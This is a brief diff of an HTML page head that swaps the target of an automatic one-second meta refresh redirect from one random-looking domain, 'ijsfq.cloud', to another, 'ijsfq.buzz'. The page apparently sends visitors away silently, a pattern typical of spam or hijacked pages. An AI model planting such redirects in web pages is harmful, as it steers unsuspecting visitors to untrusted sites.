@@ -1,5 +1,5 @@
 <head>
-<meta http-equiv="refresh" content="1;url=http://www.ijsfq.cloud/">
+<meta http-equiv="refresh" content="1;url=http://www.ijsfq.buzz/">
 </head>
   <div class="container">
       <section id="main_content">
